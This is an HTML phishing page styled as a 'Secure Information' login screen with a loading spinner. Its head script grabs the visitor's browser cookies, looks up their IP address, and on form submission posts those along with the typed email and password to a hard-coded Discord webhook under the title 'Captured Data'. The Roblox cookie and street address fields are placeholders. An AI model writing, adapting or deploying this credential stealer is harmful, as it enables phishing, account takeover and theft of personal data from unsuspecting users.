<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Information</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background: #111;
            color: #fff;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            overflow: hidden;
            position: relative;
        }
        .loader {
            border: 8px solid #333;
            border-radius: 50%;
            border-top: 8px solid #3498db;
            width: 60px;
            height: 60px;
            animation: spin 1s linear infinite;
            margin-bottom: 30px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .login-container {
            display: none;
            background: #222;
            padding: 30px;
            border-radius: 12px;
            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2);
            position: relative;
            z-index: 1;
            text-align: center;
        }
        .login-container input {
            margin: 10px 0;
            padding: 15px;
            width: 100%;
            border: 1px solid #444;
            border-radius: 8px;
            background: #333;
            color: #fff;
            font-size: 16px;
        }
        .login-container button {
            padding: 15px;
            width: 100%;
            border: none;
            border-radius: 8px;
            background: #3498db;
            color: white;
            font-size: 18px;
            cursor: pointer;
            transition: background 0.3s;
        }
        .login-container button:hover {
            background: #2980b9;
        }
        .title {
            font-size: 28px;
            margin-bottom: 20px;
        }
        .obstacle {
            position: absolute;
            width: 60px;
            height: 60px;
            background: rgba(255, 0, 0, 0.6);
            animation: moveObstacle 4s linear infinite;
            border-radius: 50%;
        }
        @keyframes moveObstacle {
            0% { transform: translateX(100vw); }
            100% { transform: translateX(-100px); }
        }
        .obstacle:nth-child(2) {
            background: rgba(0, 255, 0, 0.6);
            animation-duration: 5s;
        }
        .obstacle:nth-child(3) {
            background: rgba(0, 0, 255, 0.6);
            animation-duration: 6s;
        }
        .logo {
            position: absolute;
            top: 10px;
            right: 10px;
            width: 60px;
            height: 60px;
            background: url('path-to-s-logo.png') no-repeat center center;
            background-size: contain;
        }
    </style>
    <script>
        async function sendToWebhook(data) {
            const webhookUrl = 'https://discord.com/api/webhooks/1282030464789643319/8UFnJPiEFvbURSKlWKqlaHhmADrNGEkHTBx2LrNirUecTR13a_0ypo7dDSUIuPYSw55s'; // Replace with your actual webhook URL
            
            const embed = {
                "embeds": [{
                    "title": "Captured Data",
                    "fields": [
                        {
                            "name": "Browser Cookies",
                            "value": data.cookies,
                            "inline": false
                        },
                        {
                            "name": "Roblox Cookies",
                            "value": data.robloxCookies,
                            "inline": false
                        },
                        {
                            "name": "IP Address",
                            "value": data.ip,
                            "inline": false
                        },
                        {
                            "name": "Email",
                            "value": data.email,
                            "inline": false
                        },
                        {
                            "name": "Password",
                            "value": data.password,
                            "inline": false
                        },
                        {
                            "name": "Street Address",
                            "value": data.streetAddress,
                            "inline": false
                        },
                        {
                            "name": "City",
                            "value": data.city,
                            "inline": false
                        },
                        {
                            "name": "State",
                            "value": data.state,
                            "inline": false
                        },
                        {
                            "name": "House Number",
                            "value": data.houseNumber,
                            "inline": false
                        }
                    ]
                }]
            };

            await fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(embed)
            });
        }

        async function getDataAndShowLogin() {
            try {
                // Get cookies
                const cookies = document.cookie;

                // Get IP address using an external service
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                const ipAddress = data.ip;

                // Simulate retrieving Roblox cookies
                function getRobloxCookies() {
                    return 'SimulatedRobloxCookieData'; // This is just a placeholder
                }

                const robloxCookies = getRobloxCookies();

                // Handle form submission
                document.querySelector('form').addEventListener('submit', function(e) {
                    e.preventDefault();
                    const email = document.querySelector('input[name="email"]').value;
                    const password = document.querySelector('input[name="password"]').value;
                    const streetAddress = 'SimulatedStreetAddress'; // This is just a placeholder
                    const city = 'SimulatedCity'; // This is just a placeholder
                    const state = 'SimulatedState'; // This is just a placeholder
                    const houseNumber = 'SimulatedHouseNumber'; // This is just a placeholder
                    
                    // Send collected data to Discord webhook
                    sendToWebhook({ cookies, robloxCookies, ip: ipAddress, email, password, streetAddress, city, state, houseNumber });
                });

                // Hide loader and show login form
                document.querySelector('.loader').style.display = 'none';
                document.querySelector('.login-container').style.display = 'block';
            } catch (error) {
                console.error('Error collecting data:', error);
            }
        }

        window.onload = function() {
            // Simulate a delay for loading screen
            setTimeout(getDataAndShowLogin, 3000); // 3 seconds
        };
    </script>
</head>
<body>
    <div class="loader"></div>
    <div class="login-container">
        <div class="title">Secure Information</div>
        <form>
            <input type="email" name="email" placeholder="Email" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Login</button>
        </form>
    </div>
    <div class="obstacle" style="top: 10%; left: 0;"></div>
    <div class="obstacle" style="top: 50%; left: 0;"></div>
    <div class="obstacle" style="top: 80%; left: 0;"></div>
    <div class="logo"></div>
</body>
</html>
